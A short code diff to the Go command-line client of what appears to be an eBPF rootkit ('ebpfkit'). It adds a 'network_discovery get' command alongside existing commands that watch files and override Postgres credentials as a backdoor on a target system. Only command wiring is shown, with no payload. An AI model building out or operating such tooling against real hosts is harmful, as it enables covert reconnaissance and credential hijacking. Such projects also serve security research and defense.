@@ -41,6 +41,10 @@ var cmdPostgresProg = &cobra.Command{
 	Use: "postgres",
 }
 
+var cmdNetworkDiscoveryProg = &cobra.Command{
+	Use: "network_discovery",
+}
+
 var cmdAddFSWatch = &cobra.Command{
 	Use:   "add [path of file]",
 	Short: "add a filesystem watch",
@@ -113,6 +117,13 @@ var cmdPutPGBackdoorSecret = &cobra.Command{
 	Short: "put overrides a set of Postgres credentials",
 	Long:  "put is used to override a set of Postgres credentials on the target system (the provided role needs to exist)",
 	RunE:  putPostgresRoleCmd,
+}
+
+var cmdGetNetworkDiscovery = &cobra.Command{
+	Use:   "get",
+	Short: "get network discovery data",
+	Long:  "get returns the list of data collected by the network discovery feature on the target system",
+	RunE:  getNetworkDiscoveryCmd,
 }
 
 var cmdDelPGBackdoorSecret = &cobra.Command{
@@ -242,4 +253,6 @@ func init() {
 	cmdPostgresProg.AddCommand(cmdDelPGBackdoorSecret)
 	EBPFKitClient.AddCommand(cmdPostgresProg)
 
+	cmdNetworkDiscoveryProg.AddCommand(cmdGetNetworkDiscovery)
+	EBPFKitClient.AddCommand(cmdNetworkDiscoveryProg)
 }
